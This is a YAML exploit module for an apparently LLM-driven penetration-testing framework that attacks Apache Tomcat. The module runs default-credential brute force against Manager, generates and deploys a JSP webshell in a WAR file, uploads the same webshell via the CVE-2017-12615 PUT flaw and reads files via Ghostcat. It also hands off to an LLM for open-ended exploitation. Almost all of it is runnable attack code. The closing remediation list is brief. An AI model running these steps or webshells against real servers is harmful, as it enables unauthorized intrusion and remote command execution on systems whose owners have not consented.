skill_id: tomcat_exploit
name: "Apache Tomcat 综合利用"
category: server_misconfig
phase: foothold
version: "3.0"

principle: |
  Tomcat 攻击面: Manager 弱口令+WAR部署 / PUT 上传 / AJP Ghostcat

match:
  rules:
    - fingerprint_contains: ["tomcat"]
    - fingerprint_contains: ["Apache Tomcat"]
    - evidence_contains: ["tomcat"]
    - evidence_contains: ["TOMCAT_MANAGER_CONFIRMED"]
    - cve_matches:
        - "CVE-2017-12615"
        - "CVE-2020-1938"

probes:
  - id: confirm_tomcat
    description: "确认 Tomcat 及版本"
    steps:
      - command: |
          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
          resp=$(curl -s "$BASE/" --max-time 10 2>/dev/null)
          echo "$resp" | head -5
          if echo "$resp" | grep -qi "Apache Tomcat\|tomcat"; then echo "TOMCAT_CONFIRMED"; fi
        parse_rules:
          - if_contains: ["TOMCAT_CONFIRMED"]
            set: { tomcat_confirmed: true }
          - if_contains: ["Apache Tomcat"]
            set: { tomcat_confirmed: true }

      - command: |
          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
          code=$(curl -s "$BASE/manager/html" -o /dev/null -w "%{http_code}" --max-time 10 2>/dev/null)
          echo "MANAGER_STATUS:$code"
          if [ "$code" = "401" ] || [ "$code" = "403" ]; then echo "MANAGER_EXISTS"; fi
        parse_rules:
          - if_contains: ["MANAGER_EXISTS"]
            set: { manager_exists: true }

  - id: check_ajp
    description: "检查 AJP 端口"
    depends_on: { tomcat_confirmed: true }
    command: |
      timeout 5 bash -c "echo '' > /dev/tcp/{TARGET_IP}/8009" 2>/dev/null && echo "AJP_OPEN" || echo "AJP_CLOSED"
    parse_rules:
      - if_contains: ["AJP_OPEN"]
        set: { ajp_open: true }

exploit_paths:
  # ═══ 路径 A: Manager 弱口令 — 仅 HTML 部署（无 /text 路径）═══
  - path_id: manager_weak_cred
    name: "Tomcat Manager 弱口令 + WAR 部署"
    priority: 1
    conditions:
      tomcat_confirmed: true
      manager_exists: true
    steps:
      # ── 步骤1: 凭据爆破（增强检测正则）──
      - id: brute_creds
        description: "遍历弱口令，有效凭据存 /tmp/tc_cred.txt"
        command: |
          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
          rm -f /tmp/tc_cred.txt

          echo "[*] Brute force @ $BASE"
          echo "[*] Container source IP:"
          hostname -I 2>/dev/null || ip -4 addr show | grep inet | head -3
          echo "[*] Connectivity test:"
          curl -s -o /dev/null -w "code=%{http_code} size=%{size_download}" "$BASE/" --max-time 5
          echo ""
          echo "[*] Manager access test (no auth):"
          curl -s -o /dev/null -w "code=%{http_code}" "$BASE/manager/html" --max-time 5
          echo ""

          for cred in tomcat:tomcat admin:admin tomcat:s3cret \
                      admin:123456 manager:manager root:root \
                      admin:admin123 tomcat:changethis admin:tomcat \
                      tomcat:admin admin:password role1:tomcat both:tomcat; do
            u=$(echo "$cred" | cut -d: -f1)
            p=$(echo "$cred" | cut -d: -f2)

            # 获取完整响应（body + 状态码）
            response=$(curl -s -L -u "$u:$p" -w "\n%{http_code}" "$BASE/manager/html" --max-time 8 2>/dev/null)
            body=$(echo "$response" | sed '$d')
            code=$(echo "$response" | tail -n1)

            # 状态码必须是 200，且 body 包含真正的 Manager 特征（放宽匹配）
            if [ "$code" = "200" ] && echo "$body" | grep -qi "Tomcat Web Application Manager\|List Applications\|Undeploy\|Listed applications"; then
              echo "$u:$p" > /tmp/tc_cred.txt
              echo "CRED_FOUND:$u:$p (html API)"
              echo "$body" | head -10
              exit 0
            elif [ "$code" = "401" ]; then
              echo "[.] $u:$p → 401 Unauthorized"
            elif [ "$code" = "403" ]; then
              echo "[.] $u:$p → 403 Forbidden (IP may be blocked)"
            else
              echo "[.] $u:$p → HTTP $code (not manager)"
            fi
          done
          echo "ALL_CREDS_FAILED"
          echo "[!] All credentials rejected. Possible causes:"
          echo "    - Tomcat RemoteAddrValve blocking container IP"
          echo "    - Non-default credentials"
        timeout: 180
        success_criteria:
          stdout_contains_any: ["CRED_FOUND"]
        on_success: create_war
        on_fail: next_path

      # ── 步骤2: 创建 webshell WAR ──
      - id: create_war
        description: "生成 WAR 包"
        command: |
          rm -rf /tmp/warshell /tmp/warshell.war
          mkdir -p /tmp/warshell
          cat > /tmp/warshell/index.jsp << 'JSPEOF'
          <%@ page import="java.util.*,java.io.*"%><%String c=request.getParameter("cmd");if(c!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",c});BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=br.readLine())!=null)out.println(l);}%>
          JSPEOF
          cd /tmp/warshell && jar -cf /tmp/warshell.war .
          ls -la /tmp/warshell.war && echo "WAR_CREATED"
        timeout: 15
        success_criteria:
          stdout_contains_any: ["WAR_CREATED"]
        on_success: try_html_deploy
        on_fail: next_path

      # ── 步骤3: HTML 表单部署（cookie jar + CSRF nonce）──
      - id: try_html_deploy
        description: "通过 html/upload 部署（cookie jar + CSRF nonce）"
        command: |
          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
          CRED=$(cat /tmp/tc_cred.txt 2>/dev/null)
          u=$(echo "$CRED" | cut -d: -f1)
          p=$(echo "$CRED" | cut -d: -f2)
          echo "[*] HTML deploy as $u:$p @ $BASE"

          COOKIE_JAR=$(mktemp)

          # GET 页面并保存状态码
          response=$(curl -s -L -u "$u:$p" -c "$COOKIE_JAR" -w "\n%{http_code}" "$BASE/manager/html" --max-time 10)
          page_body=$(echo "$response" | sed '$d')
          http_code=$(echo "$response" | tail -n1)

          echo "[*] GET /manager/html → HTTP $http_code"

          if [ "$http_code" != "200" ]; then
            echo "HTML_NOT_ACCESSIBLE: $http_code"
            rm -f "$COOKIE_JAR"
            exit 1
          fi

          # 提取 CSRF Token（两种常见格式）
          CSRF_TOKEN=$(echo "$page_body" | grep -oP 'name="org.apache.catalina.filters.CSRF_NONCE" value="\K[^"]+' | head -1)
          if [ -z "$CSRF_TOKEN" ]; then
              CSRF_TOKEN=$(echo "$page_body" | grep -oP 'CSRF_NONCE=\K[A-Za-z0-9]+' | head -1)
          fi

          if [ -z "$CSRF_TOKEN" ]; then
              echo "NO_CSRF_TOKEN"
              rm -f "$COOKIE_JAR"
              exit 1
          fi

          echo "[*] CSRF Token: $CSRF_TOKEN"
          UPLOAD_URL="$BASE/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=$CSRF_TOKEN"

          # POST 部署
          upload_resp=$(curl -s -L -u "$u:$p" -b "$COOKIE_JAR" \
              -F "deployWar=@/tmp/warshell.war" \
              "$UPLOAD_URL" --max-time 20 2>/dev/null)

          rm -f "$COOKIE_JAR"

          echo "[*] Upload response length: ${#upload_resp}"
          if echo "$upload_resp" | grep -q "/warshell"; then
              echo "HTML_DEPLOY_OK"
              exit 0
          else
              echo "HTML_DEPLOY_FAILED"
              echo "$upload_resp" | head -5
              exit 1
          fi
        timeout: 40
        success_criteria:
          stdout_contains_any: ["HTML_DEPLOY_OK"]
        on_success: verify_rce
        on_fail: next_path

      # ── 步骤4: 验证 RCE ──
      - id: verify_rce
        description: "访问 webshell 执行 id"
        command: |
          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
          sleep 2
          result=$(curl -s "$BASE/warshell/index.jsp?cmd=id" --max-time 10 2>/dev/null)
          echo "RCE: $result"
          echo "$result" | grep -q "uid=" && echo "TOMCAT_RCE_CONFIRMED" && exit 0
          result2=$(curl -s "$BASE/warshell/?cmd=id" --max-time 10 2>/dev/null)
          echo "RCE2: $result2"
          echo "$result2" | grep -q "uid=" && echo "TOMCAT_RCE_CONFIRMED"
        timeout: 20
        success_criteria:
          stdout_regex: "(uid=\\d+\\(\\w+\\)|TOMCAT_RCE_CONFIRMED)"
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "webshell_war"

  # ═══ 路径 B: PUT 上传 JSP ═══
  - path_id: put_upload
    name: "PUT 方法上传 JSP (CVE-2017-12615)"
    priority: 2
    conditions:
      tomcat_confirmed: true
    steps:
      - id: put_jsp
        description: "PUT 上传 JSP 并验证"
        command: |
          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
          echo "=== PUT /file.jsp/ ==="
          curl -s -X PUT "$BASE/pentest_cmd.jsp/" -d '<%@page import="java.util.*,java.io.*"%><%String c=request.getParameter("cmd");if(c!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",c});BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=br.readLine())!=null)out.println(l);}%>' --max-time 10 2>/dev/null
          sleep 1
          result=$(curl -s "$BASE/pentest_cmd.jsp?cmd=id" --max-time 10 2>/dev/null)
          echo "RESULT: $result"
          if echo "$result" | grep -q "uid="; then echo "TOMCAT_PUT_RCE"; exit 0; fi
          echo "=== PUT /file.jsp (direct) ==="
          curl -s -X PUT "$BASE/pentest_cmd2.jsp" -d '<%@page import="java.util.*,java.io.*"%><%String c=request.getParameter("cmd");if(c!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",c});BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=br.readLine())!=null)out.println(l);}%>' --max-time 10 2>/dev/null
          sleep 1
          result2=$(curl -s "$BASE/pentest_cmd2.jsp?cmd=id" --max-time 10 2>/dev/null)
          echo "RESULT2: $result2"
          if echo "$result2" | grep -q "uid="; then echo "TOMCAT_PUT_RCE"; fi
        timeout: 30
        success_criteria:
          stdout_regex: "(uid=\\d+\\(\\w+\\)|TOMCAT_PUT_RCE)"
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "webshell_put"

  # ═══ 路径 C: AJP Ghostcat ═══
  - path_id: ajp_ghostcat
    name: "AJP Ghostcat 文件读取"
    priority: 3
    conditions:
      tomcat_confirmed: true
      ajp_open: true
    steps:
      - id: ghostcat_read
        description: "通过 AJP 读取 WEB-INF/web.xml"
        command: |
          nmap -p 8009 --script ajp-request --script-args ajp-request.path=/WEB-INF/web.xml {TARGET_IP} 2>/dev/null
        timeout: 20
        success_criteria:
          stdout_contains_any: ["web-app", "servlet", "xml version"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "file_read_ajp"

  # ═══ 路径 D: LLM 兜底 ═══
  - path_id: llm_freeform
    name: "LLM 自由推理"
    priority: 99
    mode: react_freeform
    max_rounds: 5
    conditions:
      tomcat_confirmed: true

remediation: |
  1. 修改或禁用 Manager 默认凭据，限制访问 IP
  2. 确保 DefaultServlet 的 readonly=true
  3. 如不需要 AJP，删除 AJP Connector
  4. 保持 Tomcat 版本更新